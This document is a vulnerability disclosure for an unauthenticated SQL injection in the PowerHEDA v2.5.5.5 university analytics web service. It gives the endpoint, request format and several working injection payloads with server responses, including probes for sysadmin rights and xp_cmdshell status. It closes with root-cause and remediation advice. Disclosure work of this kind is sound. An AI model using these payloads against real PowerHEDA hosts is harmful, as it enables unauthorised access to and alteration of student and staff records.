# PowerHEDA v2.5.5.5 — Unauthenticated SQL Injection in `GetFilterUniqueItems`

- **Exploit Title**: PowerHEDA v2.5.5.5 - Unauthenticated SQL Injection (`GetFilterUniqueItems`)
- **Date**: 2026-09-02
- **Exploit Author**: Imraan Khan (Lich-Sec)
- **Vendor**: IDSC Consulting Pty (Ltd)
- **Vendor Homepage**: [https://www.heda.co.za/](https://www.heda.co.za/)
- **Product**: PowerHEDA (Higher Education Data Analyser)
- **Version**: 2.5.5.5 (build path `PowerHEDA V255`)
- **Tested On**: IIS / ASP.NET / Microsoft SQL Server
- **CVE**: Pending assignment
- **CWE**: CWE-89
- **CVSS v3.1**: 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Category**: WebApps

---

## Disclaimer

This issue was found during an authorised security assessment. The customer hostname is withheld. The proof below is **identity-only SQL**. It does not include operating-system command execution or extraction of student, staff, or academic records.

---

## Description

PowerHEDA v2.5.5.5 exposes a query-builder web service at `HedaDataRetrieval.asmx`. The `GetFilterUniqueItems` method takes a JSON body and interpolates the attacker-controlled `fColumn` value into a T-SQL **identifier** (column name).

A non-column value returns `Invalid column name '1'`. Closing the identifier with `]` and injecting a derived table executes attacker SQL as the application database principal.

**No application cookie, token, or registered user is required.** The same JSON POST succeeds with and without Forms Authentication.

Exception stacks on the tested build name IDSC product source, not a campus-only customisation:

```text
at heda_be.Data.db.GetData(...) in ...\heda_be\Data\db.vb:line 201
at PowerHEDA.QueryBuilderDataRetrieval.GetFilterUniqueItems(...)
   in ...\PowerHEDA V255\PowerHEDA\webservices\HedaDataRetrieval.asmx.vb:line 600
```

---

## Affected configuration

| Item | Value |
|------|--------|
| HTTP | `POST` JSON, `Content-Type: application/json` |
| Path (typical) | `/PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems` |
| Body fields | `fColumn` (sink), `fKey`, `fWhere` |
| Auth | None observed on this method |
| Confirmed version | **2.5.5.5** (footer `PowerHEDA © 2019`; exception path `PowerHEDA V255`) |

`fKey` and `fWhere` are accepted by the method. **`fColumn` is the confirmed injection sink.** Sibling methods `GetQuickCriteriaValues` and `BuildFormulaBuilder` / `fSQL` were not raw SQL on this build and are not claimed here.

---

## Steps to Reproduce

Reproduce only on a lab instance or a host you are authorised to test. Do not run these requests against third-party universities. Host is redacted. Same JSON envelope every time; only `fColumn` changes. **No `Cookie` header.** `sysadmin` / `xp_cmdshell` bits are this install’s SQL configuration, not a second product defect. No operating-system command is included.

```http
POST /PowerHEDA/webservices/HedaDataRetrieval.asmx/GetFilterUniqueItems HTTP/1.1
Host: <powerheda-host>
Content-Type: application/json; charset=utf-8
Accept: application/json
```

### 1. Identifier concatenation

```json
{"fColumn":"1","fKey":"5","fWhere":""}
```

HTTP `500`:

```json
{"Message":"Invalid column name '1'.","StackTrace":"   at heda_be.Data.db.GetData(String commandText, Dictionary`2 parameters, CommandType commandType) in C:\\Dev\\Projects\\PowerHEDA\\heda_be\\Data\\db.vb:line 201\r\n   at PowerHEDA.QueryBuilderDataRetrieval.GetFilterUniqueItems(String fColumn, String fKey, String fWhere) in C:\\Dev\\Projects\\PowerHEDA V255\\PowerHEDA\\webservices\\HedaDataRetrieval.asmx.vb:line 600","ExceptionType":"System.Data.SqlClient.SqlException"}
```

### 2. `@@VERSION`

```json
{"fColumn":"x] FROM (SELECT @@VERSION AS [x]) t --","fKey":"5","fWhere":""}
```

HTTP `200`:

```json
{"d":["Microsoft SQL Server 2017 (RTM-GDR) (KB5063760) - 14.0.2080.1 (X64) \n\tJul 14 2025 12:59:30 \n\tCopyright (C) 2017 Microsoft Corporation\n\tEnterprise Edition: Core-based Licensing (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)\n"]}
```

### 3. Additional identity payloads (HTTP `200`, no cookie)

```json
{"fColumn":"x] FROM (SELECT SYSTEM_USER AS [x]) t --","fKey":"5","fWhere":""}
```
```json
{"d":["hedauser"]}
```

```json
{"fColumn":"x] FROM (SELECT USER_NAME() AS [x]) t --","fKey":"5","fWhere":""}
```
```json
{"d":["dbo"]}
```

```json
{"fColumn":"x] FROM (SELECT DB_NAME() AS [x]) t --","fKey":"5","fWhere":""}
```
```json
{"d":["PowerHEDA"]}
```

```json
{"fColumn":"x] FROM (SELECT CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(10)) AS [x]) t --","fKey":"5","fWhere":""}
```
```json
{"d":["1"]}
```

```json
{"fColumn":"x] FROM (SELECT CAST(IS_MEMBER('db_owner') AS varchar(10)) AS [x]) t --","fKey":"5","fWhere":""}
```
```json
{"d":["1"]}
```

`xp_cmdshell` `value_in_use` only (does not execute the procedure):

```json
{"fColumn":"x] FROM (SELECT CAST(value_in_use AS varchar(10)) AS [x] FROM sys.configurations WHERE name = 'xp_cmdshell') t --","fKey":"5","fWhere":""}
```
```json
{"d":["1"]}
```

Combined identity:

```json
{"fColumn":"x] FROM (SELECT SYSTEM_USER + N'|' + USER_NAME() + N'|' + DB_NAME() + N'|' + CAST(IS_SRVROLEMEMBER(N'sysadmin') AS nvarchar(4)) + N'|' + CAST(CAST(value_in_use AS int) AS nvarchar(4)) AS [x] FROM sys.configurations WHERE name = N'xp_cmdshell') t --","fKey":"5","fWhere":""}
```
```json
{"d":["hedauser|dbo|PowerHEDA|1|1"]}
```

---

## Root cause

`GetFilterUniqueItems` concatenates `fColumn` into a statement of the form:

```sql
SELECT DISTINCT [fColumn] FROM ...
```

T-SQL identifiers cannot be parameterised the same way as literals. The fix is an **allow-list** of column names, or a quoted identifier built only from validated `[A-Za-z0-9_]` characters.

---

## Impact

A remote attacker who can reach the ASMX endpoint can run arbitrary SQL as the PowerHEDA database principal **without logging in**. That typically means read and alter of the application database. Additional impact (for example operating-system commands) depends on the customer SQL login’s rights and is a deployment issue, not a second product defect.

---

## Recommendation

1. Parameterise or allow-list `fColumn`. Do not concatenate client input into SQL identifiers.
2. Require authentication on `HedaDataRetrieval.asmx` query-builder methods.
3. Apply the vendor patch when IDSC publishes a fixed PowerHEDA build.
4. Until a patch is available, restrict the ASMX endpoint to an approved network.

---

## Disclosure timeline

| Date | Event |
|------|--------|
| 2026-09-02 | Vulnerability confirmed |
| Pending | CVE assignment / public record |

---

## References

- MITRE-stable writeup (do not rename): https://github.com/stSLAYER/ZeroDayVulnerabilities-/tree/main/PowerHEDA
- This folder (may be renamed after CVE assignment): https://github.com/stSLAYER/Lich-Sec/tree/main/CVE/PowerHEDA-GetFilterUniqueItems-SQLi
- Vendor product: https://www.heda.co.za/
